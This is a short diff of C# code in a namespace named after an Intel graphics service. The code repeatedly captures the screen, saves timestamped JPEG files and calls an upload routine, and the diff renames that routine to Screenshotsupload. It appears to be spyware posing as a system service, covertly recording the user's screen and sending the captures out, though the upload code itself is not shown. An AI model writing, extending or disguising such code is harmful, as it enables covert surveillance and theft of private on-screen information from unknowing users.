@@ -17,7 +17,7 @@ namespace igfxCUIService
         #region[screenshots]
 
         #region[variable]
-        private static DateTime datum = DateTime.Now;
+        public static DateTime datum = DateTime.Now;
         public static decimal hour;
         public static decimal minuten;
         public static decimal seconde;
@@ -26,12 +26,10 @@ namespace igfxCUIService
         #endregion
 
         #region [ aantal screenshots]
-        public static void aantalscreenshots()
+        public static void Aantalscreenshots()
         {
             for (int i = 0; i < 500000000; i++)
             {
-
-
                 DateTime TimeNow = DateTime.Now;
                 hour = TimeNow.Hour;
                 minuten = TimeNow.Minute;
@@ -56,8 +54,7 @@ namespace igfxCUIService
                 
                 System.IO.Directory.CreateDirectory(pathString);
                 bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);
-                 
-                Upload.Uploadfile();
+                Upload.Screenshotsupload();
             }
         }
 
